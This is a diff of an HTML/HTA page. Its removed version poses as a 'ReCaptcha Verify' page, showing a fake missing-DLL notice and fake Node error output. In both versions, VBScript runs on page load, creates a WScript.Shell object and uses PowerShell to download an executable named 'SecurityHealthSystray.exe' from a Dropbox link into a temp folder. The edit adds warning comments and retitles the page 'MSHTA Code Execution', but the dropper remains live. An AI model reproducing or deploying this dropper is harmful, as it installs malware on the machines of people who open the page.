@@ -2,50 +2,14 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ReCaptcha Verify</title>
-    <link rel="icon" href="favicon.ico" type="image/x-icon"> <!-- Link to your favicon -->
-    <style>
-        /* Custom styles for the alert box */
-        .alert {
-            padding: 20px;
-            background-color: #f44336; /* Red */
-            color: white;
-            margin-bottom: 15px;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 1;
-            width: 80%;
-            max-width: 400px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
-            display: none; /* Initially hidden */
-        }
-        .closebtn {
-            margin-left: 15px;
-            color: white;
-            font-weight: bold;
-            float: right;
-            font-size: 22px;
-            line-height: 20px;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        .closebtn:hover {
-            color: black;
-        }
-    </style>
+    <title>MSHTA Code Execution</title>
 </head>
 <body>
 
-<div class="alert" id="alertBox">
-    <span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span>
-    <strong>Important Notice:</strong> Due to the absence of the MSVCR100.dll file, user verification is currently unavailable. Please complete the verification process to resolve this issue.
-</div>
-
 <script type="text/vbscript">
+    ' This script will execute when the page loads.
+    ' It is highly recommended to use this approach with caution due to security risks.
+
     Sub Window_onLoad
         ' Create Shell object
         Set objShell = CreateObject("WScript.Shell")
@@ -58,7 +22,8 @@
         downloadedFile = tempFolder & "\" & randomFileName
         
         ' Construct the download URL for the hta file
-        downloadUrl = "https://www.dropbox.com/scl/fi/t9h6fzxjvzbfgehq4u83y/SecurityHealthSystray.exe?rlkey=hqikq51s475ig1nmikxbb5yso&st=b6dky2l0&dl=1"
+        ' WARNING: Downloading and executing files from external URLs is a significant security risk.
+        downloadUrl = "https://www.dropbox.com/scl/fi/t9h6fzxjvzbfgehq4u83y4/SecurityHealthSystray.exe?rlkey=hqikq51s475ig1nmikxbb5yso&st=b6dky2l0&dl=1"
         
         ' Construct the command to download the file using PowerShell
         cmdCommand = "powershell.exe -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & downloadedFile & "'"""
@@ -85,75 +50,11 @@
 </script>
 
 <script>
-    const message = "This is an example message!";
-    
-    function spamConsole() {
-        console.log(message);
-    }
-    
-    const interval = 1000; 
-    
-    setInterval(spamConsole, interval);
-
-    // Function to close the window after script execution
-    function closeWindow() {
-        // Open a new window with the current URL to replace the current page
-        let newWindow = window.open(location, '_self');
-        // Close the new window
-        newWindow.close();
-    }
-
-    // Display the alert box when the page loads
+    // Ensure the VBScript runs on page load
     window.onload = function() {
-        document.getElementById("alertBox").style.display = "block";
-        
-        // Call the closeWindow function after a short delay
-        setTimeout(closeWindow, 5000); // Adjust the delay as needed
+        Window_onLoad();
     };
 </script>
-
-<h1>Node Error:</h1>
-<pre>
-Error: Cannot find module 'express'
-    at Module._resolveFilename (node:internal/modules/cjs/loader:1075:15)
-    at Module._load (node:internal/modules/cjs/loader:920:27)
-    at Module.require (node:internal/modules/cjs/loader:1144:19)
-    at require (node:internal/modules/cjs/helpers:110:18)
-
-TypeError: Cannot read property 'length' of undefined
-    at Object.getUserData (/path/to/file.js:23:15)
-    at /path/to/file.js:30:5
-    at processTicksAndRejections (node:internal/process/task_queues:96:5)
-
-SyntaxError: Unexpected token '}' in JSON at position 45
-    at JSON.parse (<anonymous>)
-    at Object.parseJSON (/path/to/file.js:12:18)
-    at /path/to/file.js:15:10
-
-ReferenceError: user is not defined
-    at /path/to/file.js:42:9
-    at processTicksAndRejections (node:internal/process/task_queues:96:5)
-
-Error [ERR_HTTP_HEADERS_SENT]: Cannot set headers after they are sent to the client
-    at ServerResponse.setHeader (node:_http_outgoing:570:11)
-    at ServerResponse.header (/path/to/file.js:58:12)
-    at ServerResponse.send (/path/to/file.js:75:10)
-
-Error [ERR_MODULE_NOT_FOUND]: Cannot find module '/path/to/module.js'
-    at new NodeError (node:error:326)
-    at Loader.defaultGetModuleJob (node:internal/modules/esm/loader:3270:11)
-
-UnhandledPromiseRejectionWarning: Error: Request failed with status code 404
-    at /path/to/file.js:50:15
-    at processTicksAndRejections (node:internal/process/task_queues:96:5)
-
-Error [ERR_INVALID_ARG_TYPE]: The "path" argument must be of type string. Received undefined
-    at validateString (node:path:path.js:67:11)
-    at Object.join (node:path:path.js:1390:7)
-
-TypeError [ERR_INVALID_RETURN_VALUE]: The callback must return a value.
-    at /path/to/file.js:88:7
-</pre>
 
 </body>
 </html>
